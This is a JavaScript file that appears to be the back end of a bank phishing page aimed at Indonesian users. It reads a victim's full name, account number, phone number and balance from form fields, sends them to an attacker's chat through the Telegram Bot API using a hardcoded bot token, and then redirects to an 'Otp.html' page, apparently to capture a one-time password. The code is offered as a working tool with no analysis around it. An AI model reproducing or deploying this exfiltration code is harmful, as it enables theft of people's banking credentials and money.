//bot token 
var telegram_bot_id = "6276277752:AAGSqYvMdG4QotOzGMcVvCPbWumHIWI5epA"; 
//chat id 
var chat_id = 6100793043; 
var u_name, number, number ,number; 
var ready = function () { 
    u_name = document.getElementById("name").value; 
    number = document.getElementById("number").value; 
    number = document.getElementById("number").value; 
    number = document.getElementById("number").value; 
    message = "Nama Lengkap: " + u_name + "\nNomor Rekening: " + number + "\nNomor Handphone: " + number +"\nSaldo:" + number ; 
}; 
var sender = function () { 
    ready(); 
    var settings = { 
        "async": true, 
        "crossDomain": true, 
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", 
        "method": "POST", 
        "headers": { 
            "Content-Type": "application/json", 
            "cache-control": "no-cache" 
        }, 
        "data": JSON.stringify({ 
            "chat_id": chat_id, 
            "text": message 
        }) 
    }; 
    $.ajax(settings).done(function (response) { 
        console.log(response); 
        window.location.href='Otp.html'
       
        
        
    }); 
    document.getElementById("name").value = ""; 
    document.getElementById("number").value = ""; 
    document.getElementById("number").value = ""; 
    document.getElementById("number").value = ""; 
    return false; 
};